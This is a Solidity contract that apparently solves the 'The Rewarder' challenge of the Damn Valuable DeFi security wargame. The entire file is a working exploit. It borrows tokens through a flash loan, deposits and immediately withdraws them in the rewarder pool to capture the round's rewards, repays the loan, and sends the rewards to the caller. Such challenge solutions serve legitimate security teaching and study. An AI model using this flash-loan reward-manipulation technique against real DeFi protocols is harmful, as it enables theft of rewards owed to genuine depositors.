// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { TheRewarderPool } from "../the-rewarder/TheRewarderPool.sol";
import { FlashLoanerPool } from "../the-rewarder/FlashLoanerPool.sol";
import { RewardToken } from "../the-rewarder/RewardToken.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";

contract TheRewarderAttack {
    TheRewarderPool immutable rewarderPool;
    DamnValuableToken immutable liquidityToken;

    constructor(TheRewarderPool _rewarderPool, DamnValuableToken _liquidityToken) {
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
    }

    function attack(
        FlashLoanerPool flashLoanerPool,
        RewardToken rewardToken,
        uint256 amount
    ) external {
        flashLoanerPool.flashLoan(amount);
        uint256 rewardsAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardsAmount);
    }

    function receiveFlashLoan(uint256 amount) external payable {
        liquidityToken.approve(address(rewarderPool), amount);
        // It will distribute rewards immediately because we've waited until new round started
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
    }
}
